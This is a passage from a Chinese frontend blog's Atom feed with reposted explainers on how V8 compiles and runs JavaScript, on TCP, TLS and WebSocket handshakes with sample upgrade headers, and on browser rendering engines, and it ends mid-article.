    <id>http://aiolimp.com/2021/08/10/v8%E6%89%A7%E8%A1%8Cjs%E7%9A%84%E8%BF%87%E7%A8%8B/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.213Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="v8-执行-js-的过程"><a href="#v8-执行-js-的过程" class="headerlink" title="v8 执行 js 的过程"></a>v8 执行 js 的过程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文意在简单的介绍一下 V8 执行 JS 的过程，通过了解 V8 执行 JS 的过程，知道 JS 代码呈现在浏览器上到底做了什么。当然本人也是在陆续探索 V8 ，文章中如有不当之处，还望不吝指正，理性交流。</p><p>众所周知，机器（CPU）只能识别机器码（二进制码），对于 JS 代码，它是识别不了的，所以当代码成为页面出现在屏幕上的时候，必然是做了很多的转译工作。</p><h2 id="V8-执行-Javascript-过程"><a href="#V8-执行-Javascript-过程" class="headerlink" title="V8 执行 Javascript 过程"></a>V8 执行 Javascript 过程</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c22fdb3bf7c6441091d97e4808918ef3~tplv-k3u1fbpfcp-zoom-1.image" alt="img"></p><p>如上图所示，我们将一步步进行拆分分析：</p><h3 id="JS-TO-AST"><a href="#JS-TO-AST" class="headerlink" title="JS TO AST"></a>JS TO AST</h3><p>在 V8 引擎拿到 JS 代码之后，<strong>解析器</strong>（Parser）会对其进行词法分析和语法分析。</p><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p>将 JS 代码拆分成对应的 Token，Token 是能拆分的最小单位，固定 type 表述类型/属性，value 表示对应的值，如下图 Token。</p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p>在进行词法分析转为 Token 之后，解析器继续根据生成的 Token 生成对应的 AST，AST 相信前端同学并不陌生，也是热词之一，无论是在 Vue、React 中虚拟 DOM 的表示，或者 Babel 对 JS 转译的表示都是先将其转化为对应的 AST，解析器解析之后的 AST 结构如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43af5a528db34860901cbb5c03d1fc10~tplv-k3u1fbpfcp-zoom-1.image" alt="img"></p><p>可以看到，一段极小的代码片段，被解析成 AST 之后复杂了很多，在图中的 AST 还仅仅是简化后的数据，全部的 AST 其实还有很多参数，将会更复杂。</p><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>在解析器（Parser）将 JS 代码解析成 AST 之后，<strong>解释器</strong>（Ignition）根据 AST 来生成字节码（也称中间码）。前文提到 CPU 只能识别机器码，对字节码是识别不了的，这里就衍生出一个问题，如果 CPU 识别不了字节码，那为什么还要在中间插一步来耗费资源转字节码呢？效率不是很更低吗？</p><p>在计算机学科里聊效率，都逃避不了时间和空间这两个概念，绝大部分的优化都是空间换时间和时间换空间，两者的平衡，效率如何达到最高，是一个很值得深入研究的问题。</p><p>拿之前版本的 V8 引擎执行 JS 来说，是没有转字节码这一步骤的，直接从 AST 转成机器码，这个过程称为编译过程，所以每次拿到 JS 文件的时候，首先都会编译，而这个过程还是比较浪费时间的，这是一件比较头疼的事情，需要一个解决办法。</p><p>一个网页第一次打开，关闭再次去打开，大部分情况下，还是和原来 JS 文件一致的，除非开发者修改了代码，但这个可以暂时不考虑，毕竟哪个网站也不会一天闲的无聊，不停的修改，上传替换。</p><h4 id="缓存机器码"><a href="#缓存机器码" class="headerlink" title="缓存机器码"></a>缓存机器码</h4><p>按照这个思路，既然绝大多数情况下，文件不会修改，那编译后的机器码可以考虑缓存下来，这样一来，下次再打开或者刷新页面的时候就省去编译的过程了，可以直接执行了，存储机器码被分成了两种情况，一个是浏览器未关闭时候，直接存储到浏览器本地的内存中，一个是浏览器关闭了，直接存储在磁盘上，而早期的 V8 也确实是这么做的，典型的牺牲空间换时间。</p><h4 id="缓存带来的问题"><a href="#缓存带来的问题" class="headerlink" title="缓存带来的问题"></a>缓存带来的问题</h4><p>思考一个问题，从上面的图中可以看到，一个很小的代码片段，转换成 AST 之后，变大了很多，文件大了导致一个问题就是需要更大的内存来存储，而 JS 文件转成机器码（即二进制文件），会比原来的 JS 文件大几百甚至几千倍，这就意味这一个几十 KB 的 JS 文件将会达到几十 MB，这就很可怕，本来 Chrome 多进程架构就已经很占用内存了，再来这一出，配置再好的电脑，也怕是无福消受 Chrome 了，毕竟使用者体验的好坏，直接决定了一个产品在市场上是否能生存下去，尽管 V8 缓存了编译后的代码，减少了编译的时间，提高了时间上的效率，但代价是内存占用太大了，所以 Chrome 团队是有必要优化这个问题的。</p><h4 id="惰性编译"><a href="#惰性编译" class="headerlink" title="惰性编译"></a>惰性编译</h4><p>当然，引进其他技术是需要时间去开发和优化的，在一个技术架构产生的同时，必然会有劣势方面的弥补，而早期版本的 V8 为了解决占用内存和启动速度，引进了<strong>惰性编译</strong>，那么问题来了，<strong>惰性编译</strong>做了什么去提高效率的呢？</p><p><strong>惰性编译</strong>还是比较容易理解的，从作用域的角度思考，ES6 之前之只有全局作用域和函数作用域，而<strong>惰性编译</strong>的思路就是 V8 启动的时候只编译和缓存全局作用域的代码，而函数作用域中的代码，会在调用的时候去编译，同样函数内部编译后的代码一样不会被缓存下来。</p><h4 id="惰性编译存在的问题"><a href="#惰性编译存在的问题" class="headerlink" title="惰性编译存在的问题"></a>惰性编译存在的问题</h4><p>引入<strong>惰性编译</strong>之后，在编译速度和缓存上看来，都得到了提升，一切看起来似乎很完美了，对，是看起来，但是设计出来的东西，你永远不知道使用者会怎么使用，在 ES6 和 Vue、React 等这些没有普及之前，绝大部分开发者都使用的是 jQuery，以及 RequireJS 等类似产品，JQ 插件各种引用，各种插件或者开发者自己封装的方法，为了不污染其他使用者的变量，一般都封装成一个函数，这样问题就来了，<strong>惰性编译</strong>不会保存函数编译后的机器码和理解编译函数，如果一个插件太大那等到使用函数再去编译，编译的时间上就会变得很慢，这相当于是开发者将<strong>惰性编译</strong>给玩完了，路给封死了。</p><h4 id="引入字节码"><a href="#引入字节码" class="headerlink" title="引入字节码"></a>引入字节码</h4><p>好吧，玩不过开发者了，那 V8 团队只好换个思路，就引入字节码吧。首先要理解什么是字节码，字节码其实是机器码的抽象，各种字节码的相互构成，可以实现 JS 所需的所有功能，当然首先一点，字节码比机器码占用的内存要小很多很多，基本是机器码所在内存的几十甚至几百分之一，这样一来字节码缓存下来所消耗的内存还是可以接受的。</p><p>这里会有一个疑问，既然 CPU 不能识别字节码，那是不是还需要将字节码转成机器码呢？不然怎么执行，答案是肯定。解释在将 AST 转为字节码之后，会在执行的时候将字节码转成机器码，这个执行过程肯定是比直接执行机器码要慢的，所以在执行方面，速度上会比较慢，但是 JS 源码通过解析器转 AST，然后再通过解释器转字节码，这个过程是比编译器直接将 JS 源码转机器码要快很多的，全流程看来，整个时间上是差不了多少的，但是却减小了大量的内存占用，何乐而不为。</p><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><h4 id="热代码"><a href="#热代码" class="headerlink" title="热代码"></a>热代码</h4><p>在代码中，常常会有同一部分代码，被多次调用，同一部分代码如果每次都需要解释器转二进制代码再去执行，效率上来说，会有些浪费，所以在 V8 模块中会有专门的监控模块，来监控同一代码是否多次被调用，如果被多次调用，那么就会被标记为<strong>热代码</strong>，这有什么作用呢？</p><h4 id="优化编译器"><a href="#优化编译器" class="headerlink" title="优化编译器"></a>优化编译器</h4><p><strong>TurboFan</strong> (优化编译器) 这个词相信关注手机界的同学并不陌生，华为、小米等这些品牌，在近几年产品发布会上都会出现这个词，主要的能力是通过软件计算能力来优化一系列的功能，使得效率更优。</p><p>接着热代码继续说，当存在热代码的时候，V8 会借着 TurboFan 将为热代码的字节码转为机器码并缓存下来，这样一来，当再次调用热代码时，就不在需要将字节码转机器码，当然热代码相对来说还是少部分的，所以缓存也并不会占用太大内存，并且提升了执行效率，同样此处也是牺牲空间换时间。</p><h4 id="反优化"><a href="#反优化" class="headerlink" title="反优化"></a>反优化</h4><p>JS 语言是动态语言，非常之灵活，对象的结构和属性在运行时是可以发生改变的，设想一个问题，如果热代码在某次执行的时候，突然其中的某个属性被修改了，那么编译成机器码的热代码还能继续执行吗？答案是肯定不能。这个时候就要使用到优化编译器的<strong>反优化</strong>了，他会将热代码退回到 AST 这一步，这个时候解释器会重新解释执行被修改的代码，如果代码再次被标记为热代码，那么会重复执行优化编译器的这个步骤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从分析的过程来看，V8 对 JS 执行的过程，不仅使用到了解释器，还用到了优化编译器。这种两者结合去处理的方式，业界称为 JIT (Just-In-Time)。使用这种结合的方式来处理 JS，主要是利用了 AST 形成的文件较小，而通过优化编译器编译后的热代码执行效率高，两者结合，各自发挥各自的优势，将效率尽量提升到最大。</p><p>V8 所做的事情，远远不止这些，这里也仅仅是简单概况和分析一下主流程上所做的一些事情，如果细化到每个点，还有很多概念，比如内联缓存、隐藏类、快属性、慢属性、创建对象，以及笔者之前写的<a href="https://juejin.cn/post/6909239354418266119">垃圾回收</a>等等，所做的事情实在太多，就不一一例举了。</p><p>转载至<a href="https://juejin.cn/post/6971586506011967519">https://juejin.cn/post/6971586506011967519</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/categories/V8%E5%BC%95%E6%93%8E/"/>
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/tags/V8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>web中的几种“握手”</title>
    <link href="http://aiolimp.com/2021/08/10/web%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E6%8F%A1%E6%89%8B%E2%80%9D/"/>
    <id>http://aiolimp.com/2021/08/10/web%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E6%8F%A1%E6%89%8B%E2%80%9D/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-不止一种握手"><a href="#1-不止一种握手" class="headerlink" title="1. 不止一种握手"></a>1. 不止一种握手</h2><p>在早期的网络传输中，也就存在<code>TCP</code>协议需要“握手”的过程，但早期的协议有一个缺陷：通信只能由客户端发起，做不到服务器主动向客户端推送信息。 <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e16feeb3bc07~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>于是<code>WebSocket</code> 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p><p>而随着<code>SSL/TLS</code>的完善，存在已久的安全版网络协议：<code>HTTPS</code>也是迸发式发展。</p><p>最后前端领域的协议握手便成了三分天下：</p><ol><li><code>TCP</code>三次握手，归<code>HTTP</code>。</li><li><code>TLS</code>握手，归<code>HTTPS</code></li><li><code>WebSocket</code>握手，基于<code>TCP</code>协议，都能用。</li></ol><h2 id="2-TCP三次握手的终极意义"><a href="#2-TCP三次握手的终极意义" class="headerlink" title="2. TCP三次握手的终极意义"></a>2. <code>TCP</code>三次握手的终极意义</h2><p>在我之前的文章：<a href="https://juejin.cn/post/6844903826747555847#heading-5">《「真香警告」重学 TCP/IP 协议 与三次握手 》</a></p><p>也详细的讲述过<code>TCP</code>三次握手，但那时我未明确意识到其深刻含义。</p><p>就和大家一样，只在面试前会记得，过后即忘。</p><p>直到我看到《网络是怎样连接的》中的一段话：</p><blockquote><p>**在实际的通信中，序号并不是从 1 开始的，而是需要用随机数计算出一个初始值，这是因为</p></blockquote><p>如果序号都从 1 开始，通信过程就会非常容易预测，有人会利用这一点来发动攻击。**</p><blockquote><p>**但是如果初始值是随机的，那么对方就搞不清楚序号到底是从</p></blockquote><p>多少开始计算的，因此需要在开始收发数据之前将初始值告知通信对象。**</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191f9707864302~tplv-t2oaga2asx-watermark.awebp" alt="img"> 你品，你细品。三次握手不就是相互试探暗号，来确定是不是对的人吗？</p><h3 id="2-1-知识补充：一个网络包的最大长度"><a href="#2-1-知识补充：一个网络包的最大长度" class="headerlink" title="2.1 知识补充：一个网络包的最大长度"></a>2.1 知识补充：一个网络包的最大长度</h3><p>计算每个网络包能容纳的数据长度，协议栈会根据一个叫作 <code>MTU</code>的参数来进行判断。</p><p><code>MTU</code>表示一个网络包的最大长度，在以太网中一般是<code>1500</code>字节</p><p><strong><code>MTU</code>是包含头部的总长度，因此需要从<code>MTU</code>减去头部的长度，然后得到的长度就是一个网络包中所能容纳的最大数据长度，这一长度叫作<code>MSS</code>。</strong></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e41fba84d417~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e4a3dd3e16d2~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>由上两图可知，<code>MSS</code>值是<code>1460（1500-40）</code>字节，其中：</p><ol><li><code>TCP</code>固定头部<code>20</code>字节。</li><li><code>IP</code>固定头部<code>20</code>字节。</li><li><code>TCP</code>头部最长可以达到<code>60</code>字节。</li></ol><h2 id="3-TLS握手：HTTPS的核心"><a href="#3-TLS握手：HTTPS的核心" class="headerlink" title="3. TLS握手：HTTPS的核心"></a>3. <code>TLS</code>握手：<code>HTTPS</code>的核心</h2><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171913443ba4ec19~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><blockquote><p><code>HTTPS</code> 其实是一个“非常简单”的协议，<code>RFC</code> 文档很小，只有短短的 7 页，里面规定了新的协议名“<code>https</code>”，默认端口号 443，至于其他的什么请求 - 应答模式、报文结构、请求方法、<code>URI</code>、头字段、连接管理等等都完全沿用 <code>HTTP</code>，没有任何新的东西。—- 《透视<code>HTTP</code>协议》</p></blockquote><p>感兴趣的可以到这里看看：链接：<a href="https://link.juejin.cn/?target=https://tools.ietf.org/html/rfc2818">tools.ietf.org/html/rfc281…</a></p><h3 id="3-1-TLS-SSL究竟是啥？"><a href="#3-1-TLS-SSL究竟是啥？" class="headerlink" title="3.1 TLS/SSL究竟是啥？"></a>3.1 <code>TLS/SSL</code>究竟是啥？</h3><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1719134b3a7fbc68~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>很多人看到<code>TLS/SSL</code>这对词就开始蒙圈了。实际上，这两个东西是一个玩意儿：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1719135d5152b0b0~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>1999</code> 年改名：**<code>SSL 3 === TLS 1.0</code>**</p><p>目前运用最广泛的是<code>TLS 1.2</code>:</p><blockquote><p><code>TLS</code> 由记录协议、握手协议、警告协议、变更密码规范协议、扩展协议等几个子协议组成，综合使用了对称加密、非对称加密、身份认证等许多密码学前沿技术。</p></blockquote><p>由于<code>TLS/SSL</code> 协议位于应用层和传输层 TCP 协议之间。<code>TLS</code> 粗略的划分又可以分为 2 层：</p><ol><li>靠近应用层的握手协议 <code>TLS Handshaking Protocols</code></li><li>靠近 TCP 的记录层协议 <code>TLS Record Protocol</code></li></ol><p>这个篇幅展开来写就太多了，我们先关心下<code>TLS</code>握手吧。</p><h3 id="3-2-TLS握手详解"><a href="#3-2-TLS握手详解" class="headerlink" title="3.2 TLS握手详解"></a>3.2 <code>TLS</code>握手详解</h3><p><strong>TLS握手何时发生？：</strong></p><ol><li>每当用户通过<code>HTTPS</code>导航到网站并且浏览器首先开始查询网站的原始服务器时，就会进行<code>TLS</code>握手。</li><li>每当其他任何通信使用<code>HTTPS</code>（包括<code>API</code>调用和<code>HTTPS</code>查询上的DNS）时，也会发生<code>TLS</code>握手。</li><li>通过TCP握手打开TCP连接后，会发生<code>TLS</code> 握手。</li></ol><p> <strong>TLS握手期间会发生什么？</strong></p><p>在<code>TLS</code>握手过程中，客户端和服务器将共同执行以下操作：</p><ul><li>指定将使用的TLS版本（TLS 1.0、1.2、1.3等）</li><li>确定将使用哪些加密套件。</li><li>通过服务器的公钥和SSL证书颁发机构的数字签名来验证服务器的身份</li><li>握手完成后，生成会话密钥以使用对称加密</li></ul><p><strong>加密套件决定握手方式：</strong>：</p><blockquote><p><a href="https://link.juejin.cn/?target=https://razeencheng.com/post/ssl-handshake-detail">摘自：《HTTPS篇之SSL握手过程详解》</a></p></blockquote><p>在<code>TLS</code>中有两种主要的握手类型：一种基于<code>RSA</code>，一种基于<code>Diffie-Hellman</code>。 这两种握手类型的主要区别在于主秘钥交换和认证上。</p><table><thead><tr><th></th><th>秘钥交换</th><th>身份验证</th></tr></thead><tbody><tr><td>RSA握手</td><td>RSA</td><td>RSA</td></tr><tr><td>DH握手</td><td>DH</td><td>RSA/DSA</td></tr></tbody></table><p>主流的握手类型，基本都是基于<code>RSA</code>，所以以下讲解都基于<code> RSA</code>版握手。</p><p>整个流程如下图所示： <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171914a65c74d7b8~tplv-t2oaga2asx-watermark.awebp" alt="img"> 具体流程描述：</p><ol><li>客户端<code>hello</code>：客户端通过向服务器发送“问候”消息来发起握手。该消息将包括客户端支持的TLS版本，支持的加密套件以及称为“客户端随机”的随机字节字符串。</li><li>服务器<code>hello</code>：为回复客户端<code>hello</code>消息，服务器发送一条消息，其中包含服务器的<code>SSL</code>证书，服务器选择的加密套件和“服务器随机数”，即服务器生成的另一个随机字节串。</li><li>客户端发送公钥加密的预主密钥。</li><li>服务器用自己的私钥解密加密的预主密钥。<ul><li>客户端<code>finished</code>：客户端发送“完成”消息，该消息已用会话密钥加密。</li><li>服务器<code>finished</code>：服务器发送一条用会话密钥加密的“完成”消息。</li></ul></li><li>握手完成，后续通过主密钥加解密。</li></ol><h2 id="4-WebSocket握手"><a href="#4-WebSocket握手" class="headerlink" title="4. WebSocket握手"></a>4. <code>WebSocket</code>握手</h2><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191b816c90c262~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>WebSocket</code>协议实现起来相对简单。它使用<code>HTTP</code>协议进行初始握手。成功握手之后，就建立了连接，<code>WebSocket</code>基本上使用原始TCP读取/写入数据。</p><p>《图解<code>HTTP</code>》一书中的图讲的比较清楚：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191b98130ee558~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>具体步骤表现是：</p><ol><li>客户端请求：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  GET &#x2F;chat HTTP&#x2F;1.1     </span><br><span class="line">Host: server.example.com     </span><br><span class="line">Upgrade: websocket     </span><br><span class="line">Connection: Upgrade     </span><br><span class="line">Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw&#x3D;&#x3D;     </span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat     </span><br><span class="line">Sec-WebSocket-Version: 13     </span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com</span><br></pre></td></tr></table></figure><ol><li>服务端响应：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    HTTP&#x2F;1.1 101 </span><br><span class="line">Switching Protocols     </span><br><span class="line">Upgrade: websocket     </span><br><span class="line">Connection: Upgrade     </span><br><span class="line">Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk&#x3D;     </span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure><h3 id="4-1-Websocket全双工通信"><a href="#4-1-Websocket全双工通信" class="headerlink" title="4.1 Websocket全双工通信"></a>4.1 <code>Websocket</code>全双工通信</h3><p><code>Websocket</code>协议解决了服务器与客户端全双工通信的问题。</p><p><strong>那什么是单工、半双工、全双工通信？</strong></p><table><thead><tr><th>类型</th><th>能力</th></tr></thead><tbody><tr><td>单工</td><td>信息单向传送</td></tr><tr><td>半双工</td><td>信息能双向传送，但不能同时双向传送</td></tr><tr><td>全双工</td><td>信息能够同时双向传送</td></tr></tbody></table><h3 id="4-2-Websocket和Socket区别"><a href="#4-2-Websocket和Socket区别" class="headerlink" title="4.2 Websocket和Socket区别"></a>4.2 <code>Websocket</code>和<code>Socket</code>区别</h3><p><strong>可以把<code>WebSocket</code>想象成<code>HTTP</code>应用层)，<code>HTTP</code>和<code>Socket</code>什么关系，<code>WebSocket</code>和<code>Socket</code>就是什么关系。</strong></p><h4 id="1-WebSocket与HTTP的关系"><a href="#1-WebSocket与HTTP的关系" class="headerlink" title="1. WebSocket与HTTP的关系"></a>1. <strong><code>WebSocket</code>与<code>HTTP</code>的关系</strong></h4><p>相同点</p><ol><li>都是一样基于<code>TCP</code>的，都是可靠性传输协议。</li><li>都是应用层协议。</li></ol><p>不同点</p><ol><li><code>WebSocket</code>是双向通信协议，模拟<code>Socket</code>协议，可以双向发送或接受信息。<code>HTTP</code>是单向的。</li><li><code>WebSocket</code>是需要握手进行建立连接的。</li></ol><h4 id="2-Socket是什么？"><a href="#2-Socket是什么？" class="headerlink" title="2. Socket是什么？"></a>2. <strong><code>Socket</code>是什么？</strong></h4><p><code>Socket</code>是应用层与<code>TCP/IP</code>协议族通信的中间软件抽象层，它是一组接口。</p><p>在设计模式中，<code>Socket</code>其实就是一个门面模式，它把复杂的<code>TCP/IP</code>协议族隐藏在<code>Socket</code>接口后面，对用户来说，一组简单的接口就是全部，让<code>Socket</code>去组织数据，以符合指定的协议。</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191cb5e0ccc912~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><h3 id="4-3-扩展知识：Socket-IO的七层降级"><a href="#4-3-扩展知识：Socket-IO的七层降级" class="headerlink" title="4.3 扩展知识：Socket.IO的七层降级"></a>4.3 扩展知识：<code>Socket.IO</code>的七层降级</h3><p>在<code>Golang</code>、<code>Java Spring</code>等框架中，<code>websocket</code>都有一套实现<code>API</code>。 <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191bd710411ade~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>Socket.IO</code> 由两部分组成：</p><ol><li>一个服务端用于集成 (或挂载) 到 <code>Node.JS HTTP</code> 服务器： <code>socket.io</code></li><li>一个加载到浏览器中的客户端： <code>socket.io-client</code></li></ol><p>很多人以为<code>Socket.IO</code>只是<code>WebSocket</code>和<code>XHR</code>长轮询。</p><p>实际上，<code>Socket.io</code>有很多传输机制:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. WebSockets </span><br><span class="line">2. FlashSocket </span><br><span class="line">3. XHR长轮询</span><br><span class="line">4. XHR部分流：multipart&#x2F;form-data</span><br><span class="line">5. XHR轮询</span><br><span class="line">6. JSONP轮询</span><br><span class="line">7. iframe</span><br></pre></td></tr></table></figure><p>得益于这么多种传输机制，<code>Socket.io</code>兼容性完全不用担心。</p><h2 id="5-扩展：HTTPS-与HTTP-核心区别"><a href="#5-扩展：HTTPS-与HTTP-核心区别" class="headerlink" title="5. 扩展：HTTPS 与HTTP 核心区别"></a>5. 扩展：<code>HTTPS</code> 与<code>HTTP</code> 核心区别</h2><p>上面讲到 <strong><code>Socket</code>是什么？</strong>，有一点我忘了讲：</p><p><code>HTTPS</code> 与<code>HTTP</code> 核心区别在于两点：</p><ol><li>把 <code>HTTP</code> 下层的传输协议由 <code>TCP/IP</code> 换成了 <code>SSL/TLS</code></li><li>收发报文不再使用 <code>Socket API</code>，而是调用专门的安全接口。</li></ol><p>具体区别：</p><ol><li><code>HTTPS</code>协议需要到<code>CA</code>申请证书，一般免费证书很少，需要交费。</li><li><code>HTTP</code>是超文本传输协议，信息是明文传输，<code>HTTPS</code> 则是具有安全性的ssl加密传输协议。</li><li><code>HTTP</code>和<code>https</code>使用的是完全不同的连接方式，用的端口也不一样,前者是<code>80</code>,后者是<code>443</code>。</li><li><code>HTTP</code>的连接很简单,是无状态的。<code>HTTPS</code>协议是由<code>SSL+HTTP</code>协议构建的可进行加密传输、身份认证的网络协议，比<code>HTTP</code>协议安全。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.cn/post/6844904132071948295#heading-2">面试官问到三次握手，我甩出这张脑图，他服了！</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>一个浏览器是如何工作的（一）</title>
    <link href="http://aiolimp.com/2021/08/10/%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84(%E4%B8%80)/"/>
    <id>http://aiolimp.com/2021/08/10/%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84(%E4%B8%80)/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h1><h3 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h3><p><strong>渲染引擎</strong>又名<strong>浏览器内核</strong>，指负责对网页语法解析并渲染成一张可视化页面的解析器。它是浏览器最核心最重要的部位，不同内核对网页语法的解析也有不同，因此同一网页语法在不同内核的浏览器中的渲染效果也可能不同，这就是常说的<strong>浏览器差异性</strong>。</p><p>上述提到的世界五大浏览器，在自身的发展过程中都使用了一种或多种浏览器内核作为自身的渲染引擎。</p><ul><li> <strong>Google Chrome</strong>：Webkit(前期)、Blink(后期)</li><li> <strong>Apple Safari</strong>：Webkit</li><li> <strong>Mozilla Firefox</strong>：Gecko</li><li> <strong>ASA Opera</strong>：Presto(前期)、Blink(后期)</li><li> <strong>Microsoft IExplorer</strong>：Trident</li><li> <strong>Microsoft Edge</strong>：Trident(前期)、Blink(后期)</li></ul><p>因此20多年的浏览器发展史里，被大规模使用的浏览器内核也就这五个。</p><ul><li> <strong>Blink内核</strong>：由谷歌公司和欧朋公司合作自研的内核，同时谷歌公司也将其作为开源内核架构<code>Chromium</code>的一部分发布，在<code>Chrome 28+</code>和<code>Opear 15+</code>中被使用。</li><li> <strong>Webkit内核</strong>：由苹果公司自研的内核，同时也是<code>Blink内核</code>的原型，在<code>Chrome 1 ~ 28</code>和<code>Safari 1+</code>中被使用。</li><li> <strong>Gecko内核</strong>：由网景公司自研的内核，先期在<code>Navigator</code>中使用，后期推广到<code>Firefox</code>上，在<code>Firefox 1+</code>中被使用。</li><li> <strong>Presto内核</strong>：由欧朋公司自研的内核，其渲染性能达到极致但牺牲了兼容性，目前已经废弃，在<code>Opear 7 ~ 14</code>中被使用。</li><li> <strong>Trident内核</strong>：由微软公司自研的内核，由于其被包含在全世界使用率最高的<code>Windows操作系统</code>中，导致十多年时间里一直称霸浏览器内核界，在<code>IExplorer 4+</code>中被使用。</li></ul><h3 id="渲染过程"><a href="#渲染过程" class="headerlink" 